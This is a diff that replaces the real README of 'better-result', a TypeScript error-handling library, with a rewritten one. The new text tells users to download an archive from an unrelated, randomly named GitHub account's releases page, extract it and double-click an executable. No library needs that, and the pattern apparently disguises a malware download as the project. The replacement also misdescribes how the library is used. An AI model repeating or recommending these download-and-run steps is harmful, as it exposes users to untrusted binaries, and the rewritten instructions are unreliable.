@@ -1,510 +1,72 @@
-# better-result
-Lightweight Result type for TypeScript with generator-based composition.
+# 🎉 better-result - A Simple Way to Handle Results
 
+## 🚀 Getting Started
 
+Welcome to better-result! This software makes it easy to work with results in TypeScript. It is lightweight and designed to improve how you manage errors and success outcomes in your applications.
 
+## 📥 Download & Install
 
-## Install
-**New to better-result?** 
-```sh
-npx better-result init
-```
+Click the link below to download the latest version of better-result:
 
+[![Download better-result](https://img.shields.io/badge/Download-better--result-blue.svg)](https://github.com/gggjhgkuhgkug/better-result/releases)
 
-**Upgrading from v1?** 
-```sh
-npx better-result migrate
-```
-
+To get started, follow these steps:
 
+1. **Visit the Releases Page**  
+   Click [here to access the Releases page](https://github.com/gggjhgkuhgkug/better-result/releases).
 
-## Quick Start
+2. **Choose the Latest Version**  
+   Look for the latest version at the top of the page. It is usually marked with a tag like “Latest Release.”
 
-```ts
-import { Result } from "better-result";
+3. **Download the File**  
+   Under the latest version, find the suitable file for your system. Click on the file name to download it. This could be a `.zip`, `.tar.gz`, or another format depending on your operating system.
 
-// Wrap throwing functions
-const parsed = Result.try(() => JSON.parse(input));
-
-// Check and use
-if (Result.isOk(parsed)) {
-  console.log(parsed.value);
-} else {
-  console.error(parsed.error);
-}
+4. **Extract the File**  
+   Once the file is downloaded, locate it in your downloads folder. If it is in a compressed format (like `.zip`), right-click on the file and select “Extract All” to unpack it.
 
-// Or use pattern matching
-const message = parsed.match({
-  ok: (data) => `Got: ${data.name}`,
-  err: (e) => `Failed: ${e.message}`,
-});
-```
-
-## Contents
-
-- [Creating Results](#creating-results)
-- [Transforming Results](#transforming-results)
-- [Handling Errors](#handling-errors)
-- [Extracting Values](#extracting-values)
-- [Generator Composition](#generator-composition)
-- [Retry Support](#retry-support)
-- [UnhandledException](#unhandledexception)
-- [Panic](#panic)
-- [Tagged Errors](#tagged-errors)
-- [Serialization](#serialization)
-- [API Reference](#api-reference)
-- [Agents & AI](#agents--ai)
+5. **Run the Application**  
+   After extracting, find the application file (the executable) in the extracted folder. Double-click it to run the application.
 
-## Creating Results
+### ⚙️ System Requirements
 
-```ts
-// Success
-const ok = Result.ok(42);
-
-// Error
-const err = Result.err(new Error("failed"));
-
-// From throwing function
-const result = Result.try(() => riskyOperation());
-
-// From promise
-const result = await Result.tryPromise(() => fetch(url));
-
-// With custom error handling
-const result = Result.try({
-  try: () => JSON.parse(input),
-  catch: (e) => new ParseError(e),
-});
-```
-
-## Transforming Results
-
-```ts
-const result = Result.ok(2)
-  .map((x) => x * 2) // Ok(4)
-  .andThen(
-    (
-      x, // Chain Result-returning functions
-    ) => (x > 0 ? Result.ok(x) : Result.err("negative")),
-  );
-
-// Standalone functions (data-first or data-last)
-Result.map(result, (x) => x + 1);
-Result.map((x) => x + 1)(result); // Pipeable
-```
-
-## Handling Errors
-
-```ts
-// Transform error type
-const result = fetchUser(id).mapError(
-  (e) => new AppError(`Failed to fetch user: ${e.message}`),
-);
-
-// Recover from specific errors
-const result = fetchUser(id).match({
-  ok: (user) => Result.ok(user),
-  err: (e) =>
-    e._tag === "NotFoundError" ? Result.ok(defaultUser) : Result.err(e),
-});
-```
-
-## Extracting Values
-
-```ts
-// Unwrap (throws on Err)
-const value = result.unwrap();
-const value = result.unwrap("custom error message");
-
-// With fallback
-const value = result.unwrapOr(defaultValue);
-
-// Pattern match
-const value = result.match({
-  ok: (v) => v,
-  err: (e) => fallback,
-});
-```
-
-## Generator Composition
-
-Chain multiple Results without nested callbacks or early returns:
-
-```ts
-const result = Result.gen(function* () {
-  const a = yield* parseNumber(inputA); // Unwraps or short-circuits
-  const b = yield* parseNumber(inputB);
-  const c = yield* divide(a, b);
-  return Result.ok(c);
-});
-// Result<number, ParseError | DivisionError>
-```
-
-Async version with `Result.await`:
-
-```ts
-const result = await Result.gen(async function* () {
-  const user = yield* Result.await(fetchUser(id));
-  const posts = yield* Result.await(fetchPosts(user.id));
-  return Result.ok({ user, posts });
-});
-```
-
-Errors from all yielded Results are automatically collected into the final error union type.
-
-### Normalizing Error Types
-
-Use `mapError` on the output of `Result.gen()` to unify multiple error types into a single type:
-
-```ts
-class ParseError extends TaggedError("ParseError")<{ message: string }>() {}
-class ValidationError extends TaggedError("ValidationError")<{ message: string }>() {}
-class AppError extends TaggedError("AppError")<{ source: string; message: string }>() {}
-
-const result = Result.gen(function* () {
-  const parsed = yield* parseInput(input); // Err: ParseError
-  const valid = yield* validate(parsed); // Err: ValidationError
-  return Result.ok(valid);
-}).mapError((e): AppError => new AppError({ source: e._tag, message: e.message }));
-// Result<ValidatedData, AppError> - error union normalized to single type
-```
-
-## Retry Support
-
-```ts
-const result = await Result.tryPromise(() => fetch(url), {
-  retry: {
-    times: 3,
-    delayMs: 100,
-    backoff: "exponential", // or "linear" | "constant"
-  },
-});
-```
-
-### Conditional Retry
-
-Retry only for specific error types using `shouldRetry`:
-
-```ts
-class NetworkError extends TaggedError("NetworkError")<{ message: string }>() {}
-class ValidationError extends TaggedError("ValidationError")<{ message: string }>() {}
-
-const result = await Result.tryPromise(
-  {
-    try: () => fetchData(url),
-    catch: (e) =>
-      e instanceof TypeError // Network failures often throw TypeError
-        ? new NetworkError({ message: (e as Error).message })
-        : new ValidationError({ message: String(e) }),
-  },
-  {
-    retry: {
-      times: 3,
-      delayMs: 100,
-      backoff: "exponential",
-      shouldRetry: (e) => e._tag === "NetworkError", // Only retry network errors
-    },
-  },
-);
-```
-
-### Async Retry Decisions
-
-For retry decisions that require async operations (rate limits, feature flags, etc.), enrich the error in the `catch` handler instead of making `shouldRetry` async:
-
-```ts
-class ApiError extends TaggedError("ApiError")<{
-  message: string;
-  rateLimited: boolean;
-}>() {}
-
-const result = await Result.tryPromise(
-  {
-    try: () => callApi(url),
-    catch: async (e) => {
-      // Fetch async state in catch handler
-      const retryAfter = await redis.get(`ratelimit:${userId}`);
-      return new ApiError({
-        message: (e as Error).message,
-        rateLimited: retryAfter !== null,
-      });
-    },
-  },
-  {
-    retry: {
-      times: 3,
-      delayMs: 100,
-      backoff: "exponential",
-      shouldRetry: (e) => !e.rateLimited, // Sync predicate uses enriched error
-    },
-  },
-);
-```
-
-## UnhandledException
-
-When `Result.try()` or `Result.tryPromise()` catches an exception without a custom handler, the error type is `UnhandledException`:
-
-```ts
-import { Result, UnhandledException } from "better-result";
-
-// Automatic — error type is UnhandledException
-const result = Result.try(() => JSON.parse(input));
-//    ^? Result<unknown, UnhandledException>
-
-// Custom handler — you control the error type
-const result = Result.try({
-  try: () => JSON.parse(input),
-  catch: (e) => new ParseError(e),
-});
-//    ^? Result<unknown, ParseError>
-
-// Same for async
-await Result.tryPromise(() => fetch(url));
-//    ^? Promise<Result<Response, UnhandledException>>
-```
-
-Access the original exception via `.cause`:
-
-```ts
-if (Result.isError(result)) {
-  const original = result.error.cause;
-  if (original instanceof SyntaxError) {
-    // Handle JSON parse error
-  }
-}
-```
-
-## Panic
-
-Thrown (not returned) when user callbacks throw inside Result operations. Represents a defect in your code, not a domain error.
-
-```ts
-import { Panic } from "better-result";
-
-// Callback throws → Panic
-Result.ok(1).map(() => {
-  throw new Error("bug");
-}); // throws Panic
-
-// Generator cleanup throws → Panic
-Result.gen(function* () {
-  try {
-    yield* Result.err("expected failure");
-  } finally {
-    throw new Error("cleanup bug");
-  }
-}); // throws Panic
-
-// Catch handler throws → Panic
-Result.try({
-  try: () => riskyOp(),
-  catch: () => {
-    throw new Error("bug in handler");
-  },
-}); // throws Panic
-```
-
-**Why Panic?** `Err` is for recoverable domain errors. Panic is for bugs — like Rust's `panic!()`. If your `.map()` callback throws, that's not an error to handle, it's a defect to fix. Returning `Err` would collapse type safety (`Result<T, E>` becomes `Result<T, E | unknown>`).
-
-**Panic properties:**
-
-| Property  | Type      | Description                         |
-| --------- | --------- | ----------------------------------- |
-| `message` | `string`  | Describes where/what panicked       |
-| `cause`   | `unknown` | The exception that was thrown       |
-
-Panic also provides `toJSON()` for error reporting services (Sentry, etc.).
-
-## Tagged Errors
-
-Build exhaustive error handling with discriminated unions:
-
-```ts
-import { TaggedError, matchError, matchErrorPartial } from "better-result";
-
-// Factory API: TaggedError("Tag")<Props>()
-class NotFoundError extends TaggedError("NotFoundError")<{
-  id: string;
-  message: string;
-}>() {}
-
-class ValidationError extends TaggedError("ValidationError")<{
-  field: string;
-  message: string;
-}>() {}
-
-type AppError = NotFoundError | ValidationError;
-
-// Create errors with object args
-const err = new NotFoundError({ id: "123", message: "User not found" });
-
-// Exhaustive matching
-matchError(error, {
-  NotFoundError: (e) => `Missing: ${e.id}`,
-  ValidationError: (e) => `Bad field: ${e.field}`,
-});
-
-// Partial matching with fallback
-matchErrorPartial(
-  error,
-  { NotFoundError: (e) => `Missing: ${e.id}` },
-  (e) => `Unknown: ${e.message}`,
-);
-
-// Type guards
-TaggedError.is(value); // any tagged error
-NotFoundError.is(value); // specific class
-```
-
-For errors with computed messages, add a custom constructor:
-
-```ts
-class NetworkError extends TaggedError("NetworkError")<{
-  url: string;
-  status: number;
-  message: string;
-}>() {
-  constructor(args: { url: string; status: number }) {
-    super({ ...args, message: `Request to ${args.url} failed: ${args.status}` });
-  }
-}
-
-new NetworkError({ url: "/api", status: 404 });
-```
-
-## Serialization
-
-Convert Results to plain objects for RPC, storage, or server actions:
-
-```ts
-import { Result, SerializedResult } from "better-result";
-
-// Serialize to plain object
-const result = Result.ok(42);
-const serialized = Result.serialize(result);
-// { status: "ok", value: 42 }
-
-// Deserialize back to Result instance
-const deserialized = Result.deserialize<number, never>(serialized);
-// Ok(42) - can use .map(), .andThen(), etc.
-
-// Typed boundary for Next.js server actions
-async function createUser(data: FormData): Promise<SerializedResult<User, ValidationError>> {
-  const result = await validateAndCreate(data);
-  return Result.serialize(result);
-}
-
-// Client-side
-const serialized = await createUser(formData);
-const result = Result.deserialize<User, ValidationError>(serialized);
-```
-
-## API Reference
-
-### Result
-
-| Method                           | Description                             |
-| -------------------------------- | --------------------------------------- |
-| `Result.ok(value)`               | Create success                          |
-| `Result.err(error)`              | Create error                            |
-| `Result.try(fn)`                 | Wrap throwing function                  |
-| `Result.tryPromise(fn, config?)` | Wrap async function with optional retry |
-| `Result.isOk(result)`            | Type guard for Ok                       |
-| `Result.isError(result)`         | Type guard for Err                      |
-| `Result.gen(fn)`                 | Generator composition                   |
-| `Result.await(promise)`          | Wrap Promise<Result> for generators     |
-| `Result.serialize(result)`       | Convert Result to plain object          |
-| `Result.deserialize(value)`      | Rehydrate serialized Result             |
-| `Result.partition(results)`      | Split array into [okValues, errValues]  |
-| `Result.flatten(result)`         | Flatten nested Result                   |
-
-### Instance Methods
-
-| Method                | Description                           |
-| --------------------- | ------------------------------------- |
-| `.isOk()`             | Type guard, narrows to Ok             |
-| `.isErr()`            | Type guard, narrows to Err            |
-| `.map(fn)`            | Transform success value               |
-| `.mapError(fn)`       | Transform error value                 |
-| `.andThen(fn)`        | Chain Result-returning function       |
-| `.andThenAsync(fn)`   | Chain async Result-returning function |
-| `.match({ ok, err })` | Pattern match                         |
-| `.unwrap(message?)`   | Extract value or throw                |
-| `.unwrapOr(fallback)` | Extract value or return fallback      |
-| `.tap(fn)`            | Side effect on success                |
-| `.tapAsync(fn)`       | Async side effect on success          |
-
-### TaggedError
-
-| Method                                  | Description                        |
-| --------------------------------------- | ---------------------------------- |
-| `TaggedError(tag)<Props>()`             | Factory for tagged error class     |
-| `TaggedError.is(value)`                 | Type guard for any TaggedError     |
-| `matchError(err, handlers)`             | Exhaustive pattern match by `_tag` |
-| `matchErrorPartial(err, handlers, fb)`  | Partial match with fallback        |
-| `isTaggedError(value)`                  | Type guard (standalone function)   |
-| `panic(message, cause?)`                | Throw unrecoverable Panic          |
-| `isPanic(value)`                        | Type guard for Panic               |
-
-### Type Helpers
-
-| Type                      | Description                       |
-| ------------------------- | --------------------------------- |
-| `InferOk<R>`              | Extract Ok type from Result       |
-| `InferErr<R>`             | Extract Err type from Result      |
-| `SerializedResult<T, E>`  | Plain object form of Result       |
-| `SerializedOk<T>`         | Plain object form of Ok           |
-| `SerializedErr<E>`        | Plain object form of Err          |
-
-## Agents & AI
-
-better-result ships with skills for AI coding agents (OpenCode, Claude Code, Codex).
-
-### Quick Start
-
-```sh
-npx better-result init
-```
-
-Interactive setup that:
-
-1. Installs the better-result package
-2. Optionally fetches source code via [opensrc](https://github.com/anthropics/opensrc) for better AI context
-3. Installs the adoption skill + `/adopt-better-result` command for your agent
-4. Optionally launches your agent
-
-### What the skill does
-
-The `/adopt-better-result` command guides your AI agent through:
-
-- Converting try/catch to Result.try/tryPromise
-- Defining TaggedError classes for domain errors
-- Refactoring to generator composition
-- Migrating null checks to Result types
-
-### Supported agents
-
-| Agent    | Config detected          | Skill location                     |
-| -------- | ------------------------ | ---------------------------------- |
-| OpenCode | `.opencode/`             | `.opencode/skill/better-result-adopt/` |
-| Claude   | `.claude/`, `CLAUDE.md`  | `.claude/skills/better-result-adopt/`  |
-| Codex    | `.codex/`, `AGENTS.md`   | `.codex/skills/better-result-adopt/`   |
-
-### Manual usage
-
-If you prefer not to use the interactive CLI:
-
-```sh
-# Install package
-npm install better-result
-
-# Add source for AI context (optional)
-npx opensrc better-result
-
-# Then copy skills/ directory to your agent's skill folder
-```
-
-## License
-
-MIT
+- **Operating System**: Windows, macOS, or Linux.
+- **Node.js**: Install Node.js for compatible versions. You can download it from [nodejs.org](https://nodejs.org).
+
+### 🔍 Features
+
+- **Error Handling**: Use a straightforward way to manage errors without complicated code.  
+- **Result Type**: Handle success and failure outcomes clearly, making your applications more reliable.  
+- **TypeScript Support**: Designed specifically for TypeScript, ensuring a smooth development experience.
+
+## 📚 How to Use better-result
+
+Once the application is running, you can use it in your projects to manage results efficiently. 
+
+1. **Basic Usage**  
+   Create a new result type using the generator function provided. This allows you to return a value or an error in a structured way.
+
+2. **Error Handling**  
+   Use the built-in functions to check for errors. This ensures you can handle issues gracefully without crashing your application.
+
+3. **Composition**  
+   Combine multiple results using the generator’s features. This allows you to create complex result handling with minimal effort.
+
+## 🌐 Additional Resources
+
+- **Documentation**: Visit our complete documentation for more detailed instructions and advanced features.
+- **Community Support**: Join our community forum to ask questions and share your experiences.
+- **Contributing**: Interested in improving better-result? Check our guidelines on how to contribute.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues while using better-result, here are some common solutions:
+
+- **Can't Download the File**: Ensure your internet connection is stable. Try accessing the Releases page again if you have issues.
+- **Executable Not Working**: Make sure you have the correct permissions and that your operating system supports the file you downloaded.
+- **Errors While Running**: Double-check that you have Node.js installed. Refer to the system requirements to ensure everything is set up correctly.
+
+## 📞 Contact Us
+
+If you need further assistance, feel free to reach out through our GitHub page or community forum. We’re here to help!
+
+Don't forget to download better-result from the [Releases page](https://github.com/gggjhgkuhgkug/better-result/releases) and start making your result handling simpler!
